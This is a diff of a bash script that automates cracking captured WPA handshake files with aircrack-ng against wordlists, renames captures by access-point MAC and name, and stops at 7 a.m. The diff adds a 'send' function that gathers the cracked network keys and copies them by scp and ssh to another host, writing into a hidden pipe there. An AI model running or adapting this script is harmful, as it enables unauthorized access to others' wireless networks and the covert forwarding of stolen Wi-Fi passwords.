@@ -1,8 +1,7 @@
 #!/bin/bash
 
-[ $# -ne 1 ] && { echo 'need a dir!'; exit; }
+dir=${1:-~/tools/bbb}
 
-dir=$1
 cd $dir
 
 cpu_num=20
@@ -25,31 +24,34 @@ dicts=$(ls $dict_dir/*.txt -1)
 caps=$(ls $cap_dir/*.cap -1)
 [ $? != 0 ] && { echo 'no caps need crack!'; exit; }
 
+function send(){
+    echo msg=sendmail > tmp
+    echo title=wpa >> tmp
+
+    word='body='
+    for line in $(find $out_dir/*); do
+        word="$word+$line+$(cat $line)"
+    done
+    echo word $word
+    echo "$word" >> tmp
+
+    scp tmp user@192.168.4.150:/tmp/wpa
+    ssh user@192.168.4.150 "cat /tmp/wpa > /tmp/.vpipe"
+}
+
 for cap in $caps; do
     for dict in $dicts; do
         ap_name=$($aircrack $cap | head -6 | tail -1 | awk '{print $3}')
         ap_mac=$($aircrack $cap | head -6 | tail -1 | awk '{print $2}')
-        wanted=$out_dir/$ap_name\.txt
-        echo \( $(date +%d\ %H:%M) \) working on $cap use $dict ......
+        ap_mac=${ap_mac//:/-}
+        wanted=$out_dir/"$ap_mac"_"$ap_name".txt
+        mv $cap "$cap_dir"/"$ap_mac"_"$ap_name".cap && cap="$cap_dir"/"$ap_mac"_"$ap_name".cap
+
+        echo \( $(date +%d\ %H:%M) \) working on $ap_name use $dict ......
         $aircrack $cap -p $cpu_num -w $dict -l $wanted > /dev/null
-        [ -f "$wanted" ] && { echo crack one done!; mv $cap $oldcap_dir/$ap_name.cap; echo $ap_mac >> $wanted; break; }
+        [ -f "$wanted" ] && { echo crack one done!; mv $cap $oldcap_dir; break; }
+
         [ "$(date +%H)" -eq '7' ] && exit
     done
-    echo sleep 5m && sleep 5m
-    echo sleep 20 && sleep 2
+    echo sleep 1m && sleep 1m
 done
-
-exit
-
-echo msg=sendmail > tmp
-echo title=wpa >> tmp
-
-word='body='
-for line in $(find $out_dir/*); do
-    word="$word+$line+$(cat $line)"
-done
-    echo word $word
-    echo "$word" >> tmp
-
-scp tmp user@192.168.4.150:/tmp/wpa
-ssh user@192.168.4.150 "cat /tmp/wpa > /tmp/.vpipe"
